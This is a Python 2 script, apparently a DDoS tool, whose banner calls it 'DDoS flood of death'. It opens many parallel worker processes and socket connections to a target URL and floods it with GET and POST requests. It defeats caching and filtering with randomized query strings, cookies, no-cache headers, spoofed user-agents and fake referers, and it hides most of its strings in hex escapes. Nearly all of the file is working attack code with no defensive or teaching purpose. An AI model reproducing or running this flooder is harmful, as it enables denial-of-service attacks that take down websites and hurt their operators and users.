#!/usr/bin/env python
from multiprocessing import Process, Manager
import urlparse, ssl
import sys, getopt, random, time

if  sys.version_info < (3,0):
    import httplib
    HTTPCLIENT = httplib
else:
    import http.client
    HTTPCLIENT = http.client

DEBUG = True

METHOD_GET  = "\x67\x65\x74"
METHOD_POST = "\x70\x6F\x73\x74"
METHOD_RAND = "\x72\x61\x6E\x64\x6F\x6D"

JOIN_TIMEOUT=1.5

DEFAULT_WORKERS=55
DEFAULT_SOCKETS=35


class R00T(object):

    counter = [0, 0]
    last_counter = [0, 0]

    workersQueue = []
    manager = None

    url = None

    nr_workers = DEFAULT_WORKERS
    nr_sockets = DEFAULT_SOCKETS
    method = METHOD_RAND

    def __init__(self, url):

        self.url = url

        self.manager = Manager()

        self.counter = self.manager.list((0, 0))

    def exit(self):
        self.stats()
        print "DOWN!!!"

    def __del__(self):
        self.exit()

    def printHeader(self):

        print "DDoS flood of death."
        print "CoDeD By XsRJAME"
    def fire(self):

        self.printHeader()
        print "\x4D\x65\x74\x68\x6F\x64\x3A\x20\x7B0\x7D\x20\x2F\x20\x53\x61\x79\x69\x73\x69\x3A\x20\x7B\x31\x7D\x20\x2F\x20\x53\x6F\x63\x6B\x65\x64\x3A\x20\x7B\x32\x7D\x20".format(self.method, self.nr_workers, self.nr_sockets)

        if DEBUG:
            print "\x44\x65\x62\x75\x67\x20\x4D\x6F\x64\x65\x73\x20\x4F\x4E\x20\x4D\x65\x74\x68\x6F\x64\x3A\x20\x7B0\x7D\x20".format(self.nr_workers)

        for i in range(int(self.nr_workers)):

            try:

                worker = Laser(self.url, self.nr_sockets, self.counter)
                worker.method = self.method

                self.workersQueue.append(worker)
                worker.start()
            except (Exception):
                error("\x53\x61\x79\x69\x20\x42\x61\x73\x6C\x61\x74\x69\x6C\x61\x6D\x61\x64\x69\x20\x7B0\x7D".format(i))
                pass 

        print "\x4D\x6F\x6E\x69\x74\x6F\x72\x20\x62\x61\x73\x6C\x61\x74\x69\x6C\x69\x79\x6F\x72"
        self.monitor()

    def stats(self):

        try:
            if self.counter[0] > 0 or self.counter[1] > 0:

                print "\x59\x65\x64\x69\x67\x69\x20\x50\x61\x6B\x65\x74\x73\x3A\x20\x7B0\x7D\x20\x44\x44\x6F\x53\x65\x44\x20\x28\x7B\x31\x7D\x20\x47\x47\x29".format(self.counter[0], self.counter[1])

                if self.counter[0] > 0 and self.counter[1] > 0 and self.last_counter[0] == self.counter[0] and self.counter[1] > self.last_counter[1]:
                    print "Server may be DOWN! By atak.pl"
    
                self.last_counter[0] = self.counter[0]
                self.last_counter[1] = self.counter[1]
        except (Exception):
            pass 

    def monitor(self):
        while len(self.workersQueue) > 0:
            try:
                for worker in self.workersQueue:
                    if worker is not None and worker.is_alive():
                        worker.join(JOIN_TIMEOUT)
                    else:
                        self.workersQueue.remove(worker)

                self.stats()

            except (KeyboardInterrupt, SystemExit):
                print "\x43\x54\x52\x4C\x2B\x43\x20\x72\x65\x63\x65\x69\x76\x65\x64\x2E\x20\x4B\x69\x6C\x6C\x69\x6E\x67\x20\x61\x6C\x6C\x20\x77\x6F\x72\x6B\x65\x72\x73"
                for worker in self.workersQueue:
                    try:
                        if DEBUG:
                            print "\x4B\x69\x6C\x6C\x69\x6E\x67\x20\x77\x6F\x72\x6B\x65\x72\x20\x7B0\x7D".format(worker.name)
                        worker.stop()
                    except Exception, ex:
                        pass 
                if DEBUG:
                    raise
                else:
                    pass


class Laser(Process):

        
    request_count = 0
    failed_count = 0

    url = None
    host = None
    port = 80
    ssl = False
    referers = []
    useragents = []
    socks = []
    counter = None
    nr_socks = DEFAULT_SOCKETS

    runnable = True

    method = METHOD_GET

    def __init__(self, url, nr_sockets, counter):

        super(Laser, self).__init__()

        self.counter = counter
        self.nr_socks = nr_sockets

        parsedUrl = urlparse.urlparse(url)

        if parsedUrl.scheme == "\x68\x74\x74\x70\x73":
            self.ssl = True

        self.host = parsedUrl.netloc.split("\x3A")[0]
        self.url = parsedUrl.path

        self.port = parsedUrl.port

        if not self.port:
            self.port = 80 if not self.ssl else 443


        self.referers = [ 
            "\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x67\x6F\x6F\x67\x6C\x65\x2E\x63\x6F\x6D\x2F\x3F\x71\x3D",
            "\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x75\x73\x61\x74\x6F\x64\x61\x79\x2E\x63\x6F\x6D\x2F\x73\x65\x61\x72\x63\x68\x2F\x72\x65\x73\x75\x6C\x74\x73\x3F\x71\x3D",
            "\x68\x74\x74\x70\x3A\x2F\x2F\x65\x6E\x67\x61\x64\x67\x65\x74\x2E\x73\x65\x61\x72\x63\x68\x2E\x61\x6F\x6C\x2E\x63\x6F\x6D\x2F\x73\x65\x61\x72\x63\x68\x3F\x71\x3D",
            "\x68\x74\x74\x70\x3A\x2F\x2F\x76\x6B\x2E\x63\x6F\x6D\x2F\x70\x72\x6F\x66\x69\x6C\x65\x2E\x70\x68\x70\x3F\x72\x65\x64\x69\x72\x65\x63\x74\x3D",
            "\x68\x74\x74\x70\x3A\x2F\x2F\x79\x61\x6E\x64\x65\x78\x2E\x72\x75\x2F\x79\x61\x6E\x64\x73\x65\x61\x72\x63\x68\x3F\x74\x65\x78\x74\x3D",
            "\x68\x74\x74\x70\x73\x3A\x2F\x2F\x64\x75\x63\x6B\x64\x75\x63\x6B\x67\x6F\x2E\x63\x6F\x6D\x2F\x3F\x71\x3D",
            "\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x62\x69\x6E\x67\x2E\x63\x6F\x6D\x2F\x73\x65\x61\x72\x63\x68\x3F\x71\x3D",
            "\x68\x74\x74\x70\x3A\x2F\x2F\x68\x65\x6C\x70\x2E\x62\x61\x69\x64\x75\x2E\x63\x6F\x6D\x2F\x73\x65\x61\x72\x63\x68\x52\x65\x73\x75\x6C\x74\x3F\x6B\x65\x79\x77\x6F\x72\x64\x73\x3D",
            "\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x61\x73\x6B\x2E\x63\x6F\x6D\x2F\x77\x65\x62\x3F\x71\x3D",
            "\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x72\x65\x64\x64\x69\x74\x2E\x63\x6F\x6D\x2F\x73\x65\x61\x72\x63\x68\x3F\x71\x3D",
            "\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x67\x6F\x6F\x67\x6C\x65\x2E\x63\x6F\x6D\x2E\x74\x72\x2F\x3F\x71\x3D",
            "\x68\x74\x74\x70\x3A\x2F\x2F" + self.host + "\x2F"
            ]


        self.useragents = [
            "\x4D\x6F\x7A\x69\x6C\x6C\x61\x2F\x35\x2E\x30\x20\x28\x58\x31\x31\x3B\x20\x55\x3B\x20\x4C\x69\x6E\x75\x78\x20\x78\x38\x36\x5F\x36\x34\x3B\x20\x65\x6E\x2D\x55\x53\x3B\x20\x72\x76\x3A\x31\x2E\x39\x2E\x31\x2E\x33\x29\x20\x47\x65\x63\x6B\x6F\x2F\x32\x30\x30\x39\x30\x39\x31\x33\x20\x46\x69\x72\x65\x66\x6F\x78\x2F\x33\x2E\x35\x2E\x33",
            "\x4D\x6F\x7A\x69\x6C\x6C\x61\x2F\x35\x2E\x30\x20\x28\x57\x69\x6E\x64\x6F\x77\x73\x3B\x20\x55\x3B\x20\x57\x69\x6E\x64\x6F\x77\x73\x20\x4E\x54\x20\x36\x2E\x31\x3B\x20\x65\x6E\x3B\x20\x72\x76\x3A\x31\x2E\x39\x2E\x31\x2E\x33\x29\x20\x47\x65\x63\x6B\x6F\x2F\x32\x30\x30\x39\x30\x38\x32\x34\x20\x46\x69\x72\x65\x66\x6F\x78\x2F\x33\x2E\x35\x2E\x33\x20\x28\x2E\x4E\x45\x54\x20\x43\x4C\x52\x20\x33\x2E\x35\x2E\x33\x30\x37\x32\x39\x29",
            "\x4D\x6F\x7A\x69\x6C\x6C\x61\x2F\x35\x2E\x30\x20\x28\x57\x69\x6E\x64\x6F\x77\x73\x3B\x20\x55\x3B\x20\x57\x69\x6E\x64\x6F\x77\x73\x20\x4E\x54\x20\x35\x2E\x32\x3B\x20\x65\x6E\x2D\x55\x53\x3B\x20\x72\x76\x3A\x31\x2E\x39\x2E\x31\x2E\x33\x29\x20\x47\x65\x63\x6B\x6F\x2F\x32\x30\x30\x39\x30\x38\x32\x34\x20\x46\x69\x72\x65\x66\x6F\x78\x2F\x33\x2E\x35\x2E\x33\x20\x28\x2E\x4E\x45\x54\x20\x43\x4C\x52\x20\x33\x2E\x35\x2E\x33\x30\x37\x32\x39\x29",
            "\x4D\x6F\x7A\x69\x6C\x6C\x61\x2F\x35\x2E\x30\x20\x28\x57\x69\x6E\x64\x6F\x77\x73\x3B\x20\x55\x3B\x20\x57\x69\x6E\x64\x6F\x77\x73\x20\x4E\x54\x20\x36\x2E\x31\x3B\x20\x65\x6E\x2D\x55\x53\x3B\x20\x72\x76\x3A\x31\x2E\x39\x2E\x31\x2E\x31\x29\x20\x47\x65\x63\x6B\x6F\x2F\x32\x30\x30\x39\x30\x37\x31\x38\x20\x46\x69\x72\x65\x66\x6F\x78\x2F\x33\x2E\x35\x2E\x31",
            "\x4D\x6F\x7A\x69\x6C\x6C\x61\x2F\x35\x2E\x30\x20\x28\x57\x69\x6E\x64\x6F\x77\x73\x3B\x20\x55\x3B\x20\x57\x69\x6E\x64\x6F\x77\x73\x20\x4E\x54\x20\x35\x2E\x31\x3B\x20\x65\x6E\x2D\x55\x53\x29\x20\x41\x70\x70\x6C\x65\x57\x65\x62\x4B\x69\x74\x2F\x35\x33\x32\x2E\x31\x20\x28\x4B\x48\x54\x4D\x4C\x2C\x20\x6C\x69\x6B\x65\x20\x47\x65\x63\x6B\x6F\x29\x20\x43\x68\x72\x6F\x6D\x65\x2F\x34\x2E\x30\x2E\x32\x31\x39\x2E\x36\x20\x53\x61\x66\x61\x72\x69\x2F\x35\x33\x32\x2E\x31",
            "\x4D\x6F\x7A\x69\x6C\x6C\x61\x2F\x34\x2E\x30\x20\x28\x63\x6F\x6D\x70\x61\x74\x69\x62\x6C\x65\x3B\x20\x4D\x53\x49\x45\x20\x38\x2E\x30\x3B\x20\x57\x69\x6E\x64\x6F\x77\x73\x20\x4E\x54\x20\x36\x2E\x31\x3B\x20\x57\x4F\x57\x36\x34\x3B\x20\x54\x72\x69\x64\x65\x6E\x74\x2F\x34\x2E\x30\x3B\x20\x53\x4C\x43\x43\x32\x3B\x20\x2E\x4E\x45\x54\x20\x43\x4C\x52\x20\x32\x2E\x30\x2E\x35\x30\x37\x32\x37\x3B\x20\x49\x6E\x66\x6F\x50\x61\x74\x68\x2E\x32\x29",
            "\x4D\x6F\x7A\x69\x6C\x6C\x61\x2F\x34\x2E\x30\x20\x28\x63\x6F\x6D\x70\x61\x74\x69\x62\x6C\x65\x3B\x20\x4D\x53\x49\x45\x20\x38\x2E\x30\x3B\x20\x57\x69\x6E\x64\x6F\x77\x73\x20\x4E\x54\x20\x36\x2E\x30\x3B\x20\x54\x72\x69\x64\x65\x6E\x74\x2F\x34\x2E\x30\x3B\x20\x53\x4C\x43\x43\x31\x3B\x20\x2E\x4E\x45\x54\x20\x43\x4C\x52\x20\x32\x2E\x30\x2E\x35\x30\x37\x32\x37\x3B\x20\x2E\x4E\x45\x54\x20\x43\x4C\x52\x20\x31\x2E\x31\x2E\x34\x33\x32\x32\x3B\x20\x2E\x4E\x45\x54\x20\x43\x4C\x52\x20\x33\x2E\x35\x2E\x33\x30\x37\x32\x39\x3B\x20\x2E\x4E\x45\x54\x20\x43\x4C\x52\x20\x33\x2E\x30\x2E\x33\x30\x37\x32\x39\x29",
            "\x4D\x6F\x7A\x69\x6C\x6C\x61\x2F\x34\x2E\x30\x20\x28\x63\x6F\x6D\x70\x61\x74\x69\x62\x6C\x65\x3B\x20\x4D\x53\x49\x45\x20\x38\x2E\x30\x3B\x20\x57\x69\x6E\x64\x6F\x77\x73\x20\x4E\x54\x20\x35\x2E\x32\x3B\x20\x57\x69\x6E\x36\x34\x3B\x20\x78\x36\x34\x3B\x20\x54\x72\x69\x64\x65\x6E\x74\x2F\x34\x2E\x30\x29",
            "\x4D\x6F\x7A\x69\x6C\x6C\x61\x2F\x34\x2E\x30\x20\x28\x63\x6F\x6D\x70\x61\x74\x69\x62\x6C\x65\x3B\x20\x4D\x53\x49\x45\x20\x38\x2E\x30\x3B\x20\x57\x69\x6E\x64\x6F\x77\x73\x20\x4E\x54\x20\x35\x2E\x31\x3B\x20\x54\x72\x69\x64\x65\x6E\x74\x2F\x34\x2E\x30\x3B\x20\x53\x56\x31\x3B\x20\x2E\x4E\x45\x54\x20\x43\x4C\x52\x20\x32\x2E\x30\x2E\x35\x30\x37\x32\x37\x3B\x20\x49\x6E\x66\x6F\x50\x61\x74\x68\x2E\x32\x29",
            "\x4D\x6F\x7A\x69\x6C\x6C\x61\x2F\x35\x2E\x30\x20\x28\x57\x69\x6E\x64\x6F\x77\x73\x3B\x20\x55\x3B\x20\x4D\x53\x49\x45\x20\x37\x2E\x30\x3B\x20\x57\x69\x6E\x64\x6F\x77\x73\x20\x4E\x54\x20\x36\x2E\x30\x3B\x20\x65\x6E\x2D\x55\x53\x29",
            "\x4D\x6F\x7A\x69\x6C\x6C\x61\x2F\x34\x2E\x30\x20\x28\x63\x6F\x6D\x70\x61\x74\x69\x62\x6C\x65\x3B\x20\x4D\x53\x49\x45\x20\x36\x2E\x31\x3B\x20\x57\x69\x6E\x64\x6F\x77\x73\x20\x58\x50\x29",
            "\x4F\x70\x65\x72\x61\x2F\x39\x2E\x38\x30\x20\x28\x57\x69\x6E\x64\x6F\x77\x73\x20\x4E\x54\x20\x35\x2E\x32\x3B\x20\x55\x3B\x20\x72\x75\x29\x20\x50\x72\x65\x73\x74\x6F\x2F\x32\x2E\x35\x2E\x32\x32\x20\x56\x65\x72\x73\x69\x6F\x6E\x2F\x31\x30\x2E\x35\x31",
            "\x4D\x6F\x7A\x69\x6C\x6C\x61\x2F\x35\x2E\x30\x20\x28\x57\x69\x6E\x64\x6F\x77\x73\x3B\x20\x55\x3B\x20\x57\x69\x6E\x64\x6F\x77\x73\x20\x4E\x54\x20\x35\x2E\x31\x3B\x20\x70\x6C\x3B\x20\x72\x76\x3A\x31\x2E\x38\x2E\x30\x2E\x31\x29",
            "\x4A\x61\x76\x61\x2F\x31\x2E\x34\x2E\x31\x5F\x30\x34",
            "\x4F\x70\x65\x72\x61\x2F\x38\x2E\x35\x31\x20\x28\x57\x69\x6E\x64\x6F\x77\x73\x20\x4E\x54\x20\x35\x2E\x31\x3B\x20\x55\x3B\x20\x65\x6E\x3B\x56\x57\x50\x2D\x6F\x6E\x6C\x69\x6E\x65\x2E\x64\x65\x29",
            "\x57\x67\x65\x74\x2F\x31\x2E\x39\x2E\x31",
            "\x41\x70\x70\x45\x6E\x67\x69\x6E\x65\x2D\x47\x6F\x6F\x67\x6C\x65\x3B\x20\x28\x2B\x68\x74\x74\x70\x3A\x2F\x2F\x63\x6F\x64\x65\x2E\x67\x6F\x6F\x67\x6C\x65\x2E\x63\x6F\x6D\x2F\x61\x70\x70\x65\x6E\x67\x69\x6E\x65\x3B\x20\x61\x70\x70\x69\x64\x3A\x20\x77\x65\x62\x65\x74\x72\x65\x78\x29",
            "\x42\x6C\x61\x63\x6B\x42\x65\x72\x72\x79\x38\x33\x30\x30\x2F\x34\x2E\x32\x2E\x32\x20\x50\x72\x6F\x66\x69\x6C\x65\x2F\x4D\x49\x44\x50\x2D\x32\x2E\x30\x20\x43\x6F\x6E\x66\x69\x67\x75\x72\x61\x74\x69\x6F\x6E\x2F\x43\x4C\x44\x43\x2D\x31\x2E\x31\x20\x56\x65\x6E\x64\x6F\x72\x49\x44\x2F\x31\x30\x37\x20\x55\x50\x2E\x4C\x69\x6E\x6B\x2F\x36\x2E\x32\x2E\x33\x2E\x31\x35\x2E\x30",
            "\x4C\x79\x6E\x78\x2F\x32\x2E\x38\x2E\x36\x72\x65\x6C\x2E\x34\x20\x6C\x69\x62\x77\x77\x77\x2D\x46\x4D\x2F\x32\x2E\x31\x34\x20\x53\x53\x4C\x2D\x4D\x4D\x2F\x31\x2E\x34\x2E\x31\x20\x4F\x70\x65\x6E\x53\x53\x4C\x2F\x30\x2E\x39\x2E\x38\x67",
            "\x4D\x6F\x7A\x69\x6C\x6C\x61\x2F\x34\x2E\x30\x20\x28\x63\x6F\x6D\x70\x61\x74\x69\x62\x6C\x65\x3B\x20\x4D\x53\x49\x45\x20\x36\x2E\x30\x3B\x20\x57\x69\x6E\x64\x6F\x77\x73\x20\x43\x45\x3B\x20\x49\x45\x4D\x6F\x62\x69\x6C\x65\x20\x36\x2E\x35\x29",
            "\x4D\x6F\x7A\x69\x6C\x6C\x61\x2F\x35\x2E\x30\x20\x28\x57\x69\x6E\x64\x6F\x77\x73\x20\x4E\x54\x20\x31\x30\x2E\x30\x3B\x20\x57\x69\x6E\x36\x34\x3B\x20\x78\x36\x34\x29\x20\x41\x70\x70\x6C\x65\x57\x65\x62\x4B\x69\x74\x2F\x35\x33\x37\x2E\x33\x36\x20\x28\x4B\x48\x54\x4D\x4C\x2C\x20\x6C\x69\x6B\x65\x20\x47\x65\x63\x6B\x6F\x29\x20\x43\x68\x72\x6F\x6D\x65\x2F\x37\x33\x2E\x30\x2E\x33\x36\x38\x33\x2E\x31\x30\x33\x20\x53\x61\x66\x61\x72\x69\x2F\x35\x33\x37\x2E\x33\x36\x20\x4F\x50\x52\x2F\x36\x30\x2E\x30\x2E\x33\x32\x35\x35\x2E\x36\x39",
            "\x4F\x70\x65\x72\x61\x2F\x39\x2E\x38\x30\x20\x28\x57\x69\x6E\x64\x6F\x77\x73\x20\x4E\x54\x20\x35\x2E\x32\x3B\x20\x55\x3B\x20\x72\x75\x29\x20\x50\x72\x65\x73\x74\x6F\x2F\x32\x2E\x35\x2E\x32\x32\x20\x56\x65\x72\x73\x69\x6F\x6E\x2F\x33\x31\x2E\x35\x31",
            "\x4C\x79\x6E\x78\x2F\x32\x2E\x38\x2E\x38\x64\x65\x76\x2E\x31\x32\x20\x6C\x69\x62\x77\x77\x77\x2D\x46\x4D\x2F\x32\x2E\x31\x34\x20\x53\x53\x4C\x2D\x4D\x4D\x2F\x31\x2E\x34\x2E\x31\x20\x47\x4E\x55\x54\x4C\x53\x2F\x32\x2E\x31\x32\x2E\x31\x34",
            ]

    def __del__(self):
        self.stop()


    def buildblock(self, size):
        out_str = ""

        _LOWERCASE = range(97, 122)
        _UPPERCASE = range(65, 90)
        _NUMERIC   = range(48, 57)

        validChars = _LOWERCASE + _UPPERCASE + _NUMERIC

        for i in range(0, size):
            a = random.choice(validChars)
            out_str += chr(a)

        return out_str


    def run(self):

        if DEBUG:
            print "\x53\x6F\x63\x6B\x65\x74\x73\x20\x4C\x65\x72\x20\x41\x63\x69\x6C\x69\x79\x6F\x72\x2E\x2E\x2E".format(self.name)

        while self.runnable:

            try:

                for i in range(self.nr_socks):
                
                    if self.ssl:
                        c = HTTPCLIENT.HTTPSConnection(self.host, self.port)
                    else:
                        c = HTTPCLIENT.HTTPConnection(self.host, self.port)

                    self.socks.append(c)

                for conn_req in self.socks:

                    (url, headers) = self.createPayload()

                    method = random.choice([METHOD_GET, METHOD_POST]) if self.method == METHOD_RAND else self.method

                    conn_req.request(method.upper(), url, None, headers)

                for conn_resp in self.socks:

                    resp = conn_resp.getresponse()
                    self.incCounter()

                self.closeConnections()
                
            except:
                self.incFailed()
                if DEBUG:
                    raise
                else:
                    pass 

        if DEBUG:
            print "\x57\x6F\x72\x6B\x65\x72\x20\x7B0\x7D\x20\x63\x6F\x6D\x70\x6C\x65\x74\x65\x64\x20\x72\x75\x6E\x2E\x20\x53\x6C\x65\x65\x70\x69\x6E\x67\x2E\x2E\x2E".format(self.name)
            
    def closeConnections(self):
        for conn in self.socks:
            try:
                conn.close()
            except:
                pass 
            

    def createPayload(self):

        req_url, headers = self.generateData()

        random_keys = headers.keys()
        random.shuffle(random_keys)
        random_headers = {}
        
        for header_name in random_keys:
            random_headers[header_name] = headers[header_name]

        return (req_url, random_headers)

    def generateQueryString(self, ammount = 1):

        queryString = []

        for i in range(ammount):

            key = self.buildblock(random.randint(3,10))
            value = self.buildblock(random.randint(3,20))
            element = "\x7B0\x7D\x3D\x7B\x31\x7D".format(key, value)
            queryString.append(element)

        return "\x26".join(queryString)
            
    
    def generateData(self):

        returnCode = 0
        param_joiner = "\x3F"

        if len(self.url) == 0:
            self.url = "\x2F"

        if self.url.count("\x3F") > 0:
            param_joiner = "\x26"

        request_url = self.generateRequestUrl(param_joiner)

        http_headers = self.generateRandomHeaders()


        return (request_url, http_headers)

    def generateRequestUrl(self, param_joiner = "\x3F"):

        return self.url + param_joiner + self.generateQueryString(random.randint(1,5))

    def generateRandomHeaders(self):

        noCacheDirectives = ["\x6E\x6F\x2D\x63\x61\x63\x68\x65", "\x6D\x75\x73\x74\x2D\x72\x65\x76\x61\x6C\x69\x64\x61\x74\x65"]
        random.shuffle(noCacheDirectives)
        noCache = "\x2C\x20".join(noCacheDirectives)

        acceptEncoding = ["\x27\x27","\x2A","\x69\x64\x65\x6E\x74\x69\x74\x79","\x67\x7A\x69\x70","\x64\x65\x66\x6C\x61\x74\x65"]
        random.shuffle(acceptEncoding)
        nrEncodings = random.randint(0,len(acceptEncoding)/2)
        roundEncodings = acceptEncoding[:nrEncodings]

        http_headers = {
            "\x55\x73\x65\x72\x2D\x41\x67\x65\x6E\x74": random.choice(self.useragents),
            "\x43\x61\x63\x68\x65\x2D\x43\x6F\x6E\x74\x72\x6F\x6C": noCache,
            "\x41\x63\x63\x65\x70\x74\x2D\x45\x6E\x63\x6F\x64\x69\x6E\x67": "\x2C\x20".join(roundEncodings),
            "\x43\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E": "\x6B\x65\x65\x70\x2D\x61\x6C\x69\x76\x65",
            "\x4B\x65\x65\x70\x2D\x41\x6C\x69\x76\x65": random.randint(110,120),
            "\x48\x6F\x73\x74": self.host,
        }
    
        if random.randrange(2) == 0:
            acceptCharset = [ "\x49\x53\x4F\x2D\x38\x38\x35\x39\x2D\x31", "\x75\x74\x66\x2D\x38", "\x57\x69\x6E\x64\x6F\x77\x73\x2D\x31\x32\x35\x31", "\x49\x53\x4F\x2D\x38\x38\x35\x39\x2D\x32", "\x49\x53\x4F\x2D\x38\x38\x35\x39\x2D\x31\x35", ]
            random.shuffle(acceptCharset)
            http_headers["\x41\x63\x63\x65\x70\x74\x2D\x43\x68\x61\x72\x73\x65\x74"] = "\x7B\x30\x7D\x2C\x7B\x31\x7D\x3B\x71\x3D\x7B\x32\x7D\x2C\x2A\x3B\x71\x3D\x7B\x33\x7D".format(acceptCharset[0], acceptCharset[1],round(random.random(), 1), round(random.random(), 1))

        if random.randrange(2) == 0:
            http_headers["\x52\x65\x66\x65\x72\x65\x72"] = random.choice(self.referers) + self.buildblock(random.randint(5,10))

        if random.randrange(2) == 0:
            http_headers["\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x54\x79\x70\x65"] = random.choice(["\x6D\x75\x6C\x74\x69\x70\x61\x72\x74\x2F\x66\x6F\x72\x6D\x2D\x64\x61\x74\x61", "\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x78\x2D\x75\x72\x6C\x2D\x65\x6E\x63\x6F\x64\x65\x64"])

        if random.randrange(2) == 0:
            http_headers["\x43\x6F\x6F\x6B\x69\x65"] = self.generateQueryString(random.randint(1, 5))

        return http_headers

    def stop(self):
        self.runnable = False
        self.closeConnections()
        self.terminate()

    def incCounter(self):
        try:
            self.counter[0] += 1
        except (Exception):
            pass

    def incFailed(self):
        try:
            self.counter[1] += 1
        except (Exception):
            pass
        
print \
"""
                                                              .%%/..                                                                                                                                 
                                      (             .(@@@@%#((,                                                                                                                    
.. .*&#.      .                      ,&      .*         .@@@@@@@@@@@@@@@@@&(*                                                                                                      
        .#&,                       .&%      /@*       /@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&&*.                                                                                           
           .#@@&#,                %@(    /@@%         /@@.        .,/@@@@@@@@@@@@@@@@@@@@@@@@@@&%((*                                                                               
         *@@@@@@@@@@@@(..      ,&@/  ,%@@(,%@@,./      (#                 #@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&&/,                                                                  
        ,@@%,,,(&@@@@@@@@@(.%@#**%&@@&*(@@@(,%@*#(*,*/. ,&.                 *@@@@@@@,   ,.       ..,,*(%&@@@@@@@@@@@@&#,                                                           
         &.       ,(@@@#,&@/%@@@(.(&@#*/%@@@/*@&                             .@@@@@/   .@@@@@/                ..*#@@@@@@@@@@&#/.                                                   
         ,*            *@@./(,/(*,%@@%,,#&@@@@@%,                              %@@@@.   /@@@@@@@@&/.                   .*(&@@@@@@@@@@@@@@@@&#(,.                                   
                  ,   (@@#,%,#@@@#(%@@@@@@@@@@@@@@@@%*         ,                @@@@@&.  ,@@@@@@@@@@@@@&#*     /##(.           .*(%@@@@@@@@@@@@@@@@%*                              
                  %. (@#*%@@@%///*#@@@@@@@@@@@@@@@@#((#@@@@%(,                  *@@@@@@@&,  *&@@@@@@@@@@@@@@@%/.    ./%@@&#/,          ,/#@@@@@@@@@@@@@#.                          
                 ,@@@@@&@@@*%@@@@&#@@@ **.,@@@@@@%#&*                           /@@@@@@@@@@&.  ,%@@@@@@@@@@@@@@@@@@(,     ./#@@@@@@#*.        ,(&@@@@@@@@@%,                       
                 .&@@@@@((@@@&#,.**,(*#* %(&@@@@@@@(&@@&#/.                    .@@@@@@@@@@@@@#    ,@@@@@@@@@@@@@@@@@@@@@#*       ,(&@@@@@@&#/       ,(&@@@@@@&,                    
                  /@/*@@@*      *@@#%@@%#@,&@@@@*/(#//*#@@@@@@%/.             *@@@@@@@@@@@@@@*    .&@@@@@@@@@@@@@@@@@@@@@@@@@@#,      .*&@@@@@@@@#*      .*%@@@@&/                 
                   *%(& *     ,@@@@@@@@@@&,@@@@.   *&@@@@@@@@@@@@@@@%,      /@@@@@@&#*            &@@@@@@@@&#,          ,/#&@@@@@@@&/.     .#@@@@@@@@@&*      ./&@@@%.             
                   &(.,   . (@@@@@@@@@@@&*@@%  ,/     ,&@@@@@@@@@@@&@@/.,#@@@&#.               .%&@@@@%*. *(%@@@@@@@@@@@@&#(*. .%@@@@@@@&(.    *&@@@@@@@@@@*       /@@@@*          
                   *      #@@@@@@@@@@@@((@@@.            .&@@@%**&@@@@@@@@&,*@@(.          ,#@@@@@/  *&@@@@@@@@@@@@@@@@@@@@@@@@@@&/./&@@@@@@@%,    *#&@@@@@@@@#        (@@@,       
                        (@@@@@@@@@@@@@*%@@,./             * .#@@@@@@@@@@( /@@@@@@@@@@/..*@@@@@&  .&@@@@@@@@@@@&&&&&@@@@@@@@@@@@@@@@@@@#. *&@@@@@@&,. .     ,(&@@@(        .#@%.    
                       @@@@@@@@@@@@@@%@#.%*             ,#@@@@@@@@@@@@*       .*&@@@@*#@@@@&. /@@@&(, .   ...*((#(#((/*,..  ./&@@@@@@@@@@@&*. .%@@@@@(.          ,&&,         %@(  
                      &@@@@@@@@@@@@@@  ,* /   ,,  #@@@@@@@@@@@@@@@@@.              ,@@@@@% (**&(,(@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*  .*%@@@@@@@@#,  /&@@@#            ((         (@,
                     (@@@@@@@@@@@@@@@%    ,@. ,%@@@/#@@@@@@@@@@@@@@,          *@@@@@@@@&   (*@@@@@&#(,                    .(#@@@@@@@@@#.   /@@@@@@@@#. ,@@@#            (.       ,@
      %@@@(          %@@@@@@@@@@@@@@@@&@@@%  /@@@@@#    #@@@@@@@@@@.      /@@@@@@@@@@@.    &@@, (@@@@@(./&@#.                     ..%@@@@@@(  .@@@@@@@@@&. %@@,  .                 
    / &&@@.@@#     ((#@@@@@@@@@@@@@@@@@@@. /@@@@@@@@( .,    *@@@@@@&    ,@@@@@@@@@@@/    (/    ,%@@@/*/&@@@@(                            (@@@@@@#*%@@@@@@@@@& *@&.                 
      (@@@@@@@&  .@@/#@@@@@@@@@@@@@@&@@, %@@@@@@@@@@@./@@@@@%/.   ,%@@.   .**./&@@@@#      *@@*          .*@@@@&                             .#@@@@@(    .&@@@@@*.&#               
      %@,   &@/ *@@@*%@@@@@@@@@@@@@@@. /@@@@@@@@@@@@@& %@@@@@@@@@@@@@@@@@@@%/.     ,*&@/%&,                   /@@@#                               ,@@@&.    .&@@@@@( %,            
      .(#,..&@&@@@@@#/@@@@@@@@@@@@@#  &@@@@@@@@@@@@@@@&.(@@@@@@@@@@@@&@@@&,*@@@@*        ..                      .%@@*   (                         . .&@&       ,((#@@%,%,         
           .@@@@@@@@@,@@@@@@@@@@@@(,@@%..&@@@@@@@@@@@@@@./@@@@@@@@@%,&#.%**@@ %@%## ,@@@@@##&&@%    ..              ./@&,#                              #@.            .,/.(       
            (@@#//.   %@@@@@@@@@@@,@@@@@@@/*&,(@@@@@@@@@# (@@@@@@@@@*@@@&@@@@@,@(&@@@@//&@@@@@@@@@%.                    ,%/%.    /                       /@,            ,,,.       
             .%*      .@@@@@@@@@&.&@@@@@@@@@#  .@@@@@@@@@ .@@@@@@@@@(/@@@@@@@@@,(/@@@@@@@@&#/(#@@@@@&&.                     &%/#,/%&@@@@@&/#%,(,          ,&             %.(/(     
                       *@@@@@@@@#*@@@@@@@@@@@* ,@@@@@@@&. %@@@@@@@@@#&@@@@@@@@@@*&@@@@@@@@@@@@@@@%/.,(&@@@  .((,.       ,  (%.#@@@@@@@@@@@@@@(@#           /.            *#%*.,    
